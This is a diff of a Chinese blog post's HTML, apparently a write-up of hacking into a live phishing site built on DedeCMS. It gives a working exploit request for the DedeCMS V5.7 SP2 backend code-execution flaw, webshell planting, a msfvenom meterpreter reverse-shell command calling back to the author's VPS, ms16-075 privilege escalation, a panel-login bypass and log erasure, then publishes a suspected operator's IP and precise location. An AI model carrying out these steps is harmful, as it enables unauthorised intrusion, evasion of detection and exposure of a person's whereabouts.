@@ -303,52 +303,45 @@
       
         
           
-            <p>#0X01    引言</p>
-<p>前段时间刚好遇到了一个以dedeCMS为后台管理的钓鱼网站，但是当时没有什么思路提权就放弃了，后来在信安之路看到了了一个关于攻击这种钓鱼网站的帖子，晓得了怎么再进行下一步提权并溯源的操作。</p>
+            <h1 id="0X01-引言"><a href="#0X01-引言" class="headerlink" title="0X01    引言"></a>0X01    引言</h1><p>前段时间刚好遇到了一个以dedeCMS为后台管理的钓鱼网站，但是当时没有什么思路提权就放弃了，后来在信安之路看到了了一个关于攻击这种钓鱼网站的帖子，晓得了怎么再进行下一步提权并溯源的操作。</p>
 <p>然而刚刚好，xxx同学发给我了一个和之前遇到的一模一样的钓鱼站，遂有了下面的故事</p>
 <p>此次是为了记录学习一些操作</p>
-<p>#0X02    入侵钓鱼站</p>
-<p>##GetShell</p>
-<p>由于有了之前那位小姐姐的帖子，没有进行信息搜集就直接开干了</p>
+<h1 id="0X02-入侵钓鱼站"><a href="#0X02-入侵钓鱼站" class="headerlink" title="0X02    入侵钓鱼站"></a>0X02    入侵钓鱼站</h1><h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>由于有了之前那位小姐姐的帖子，没有进行信息搜集就直接开干了</p>
 <p>网站域名一般为：<code>http://xxxx.icu/Ru_op/</code>这种格式的</p>
 <p><code>http://xxxx.icu/dede/</code>是网站的管理后台</p>
 <p>通过<code>DedeCMS V5.7 SP2后台存在代码执行漏洞</code></p>
 <p>参考链接：<code>https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E</code></p>
 <p>首先，需要先获取到自己的<code>token</code><br><code>5f4193b27040861d563fe3505f90d5de</code></p>
-<p>！<a href="/img/diaoyu_1.png"></a></p>
+<p><img src="/img/diaoyu_1.png" alt=""></p>
 <p>然后带入到<code>域名 + /dede/tpl.php?filename=secnote.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=[你的token值</code>里边</p>
 <p>在这里执行<code>http://xxxx.icu/dede/tpl.php?filename=secnote.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=[5f4193b27040861d563fe3505f90d5de</code></p>
-<p>！<a href="/img/diaoyu_2.png"></a></p>
+<p><img src="/img/diaoyu_2.png" alt=""></p>
 <p>在<code>http://xxxx.icu/include/taglib/secnote.lib.php</code>查看返回结果<br>这里有一个关键的信息</p>
-<p>！<a href="/img/diaoyu_3.png"></a></p>
+<p><img src="/img/diaoyu_3.png" alt=""></p>
 <p>将原来的<code>&lt;?php phpinfo()?&gt;</code>修改为一句话，然后用菜刀连接上，成功getshell<br>这里要注意，菜刀连接的方式需要选择base64编码，不然会出现错误</p>
-<p>！<a href="/img/diaoyu_4.png"></a></p>
+<p><img src="/img/diaoyu_4.png" alt=""></p>
 <p>这里要注意，这个钓鱼站点默认是关闭了系统函数的，这就需要修改<code>php.ini</code>中的<code>disable_functions</code><br>虽然现在的用户权限无法读取<code>BTsoft</code>目录下的内容，但是可以直接读取<code>D:/BtSoft/WebSoft/php/5.2/</code>目录，因为网站是基于这个php文件运行的，所以拥有相同的权限，这样我们就可以修改<code>php.ini</code>文件了</p>
 <p>在这里我已经修改完毕了</p>
-<p>！<a href="/img/diaoyu_5.png"></a></p>
-<p>##提权</p>
-<p>上传做好的反弹shell的木马程序</p>
+<p><img src="/img/diaoyu_5.png" alt=""></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上传做好的反弹shell的木马程序</p>
 <p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f exe &gt; shell.exe</code></p>
-<p>！<a href="/img/diaoyu_6.png"></a></p>
+<p><img src="/img/diaoyu_6.png" alt=""></p>
 <p>然后在VPS上监听所设置的端口,并将获取到的meterpreter会话放置到后台，再使用<code>ms16-075</code>进行提权</p>
-<p>！<a href="/img/diaoyu_7.png"></a></p>
-<p>提权成功！接下来就是创建用户，开启远程桌面了。</p>
-<p>#0X03开启远程桌面</p>
-<p>当时开启远程桌面的时候不晓得为什么一直无法开启，后来想想，应该是修改了远程桌面的端口，查看端口发现一个8611端口，是宝塔的web服务端口</p>
+<p><img src="/img/diaoyu_7.png" alt=""></p>
+<p>提权成功!接下来就是创建用户，开启远程桌面了。</p>
+<h1 id="0X03开启远程桌面"><a href="#0X03开启远程桌面" class="headerlink" title="0X03开启远程桌面"></a>0X03开启远程桌面</h1><p>当时开启远程桌面的时候不晓得为什么一直无法开启，后来想想，应该是修改了远程桌面的端口，查看端口发现一个8611端口，是宝塔的web服务端口</p>
 <p>不晓得账号密码，怎么登录呢，在这里我将代码逻辑修改了下，不将获取到的用户名密码与数据库进行比对，直接登录</p>
-<p>成功登录！</p>
-<p>！<a href="/img/diaoyu_8.png"></a></p>
+<p>成功登录!</p>
+<p><img src="/img/diaoyu_8.png" alt=""></p>
 <p>说实话，宝塔面板真的挺好用</p>
 <p>登录远程桌面</p>
-<p>！<a href="/img/diaoyu_9.png"></a></p>
-<p>#0X04清理痕迹</p>
-<p>这里没有认真的清理自己所留下的痕迹，主要清除的是面板操作日志</p>
-<p>！<a href="/img/diaoyu_10.png"></a></p>
+<p><img src="/img/diaoyu_9.png" alt=""></p>
+<h1 id="0X04清理痕迹"><a href="#0X04清理痕迹" class="headerlink" title="0X04清理痕迹"></a>0X04清理痕迹</h1><p>这里没有认真的清理自己所留下的痕迹，主要清除的是面板操作日志</p>
+<p><img src="/img/diaoyu_10.png" alt=""></p>
 <p>这一步也做了好久，才发现宝塔的数据以及面板日志都存放在了<code>D:\BtSoft\ServerAdmin\bt_default.sqlite</code>文件中</p>
 <p>使用<code>Dbeaver</code>打开<code>bt_default.sqlite</code>,并将我的登录和操作痕迹擦除</p>
-<p>！<a href="/img/diaoyu_11.png"></a></p>
-<p>#结尾</p>
-<p>搜集了下服务器信息，发现经常登录的一个IP<br>    223.111.137.157(这个应该是钓鱼的人的IP)<br>    江苏省镇江市<br>    定位半径：0米<br>    纬度坐标：27.922104<br>    经度坐标：116.351444<br>    详细地址：江西省 抚州市 临川区<br>    精确地址：江西省抚州市临川区 下饶东南148米</p>
+<p><img src="/img/diaoyu_11.png" alt=""></p>
+<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>搜集了下服务器信息，发现经常登录的一个IP<br>    223.111.137.157(这个应该是钓鱼的人的IP)<br>    江苏省镇江市<br>    定位半径：0米<br>    纬度坐标：27.922104<br>    经度坐标：116.351444<br>    详细地址：江西省 抚州市 临川区<br>    精确地址：江西省抚州市临川区 下饶东南148米</p>
 <p>也没啥好玩的了，没有jsonp漏洞，也获取不到其他的信息了，溜了溜了</p>
 
           
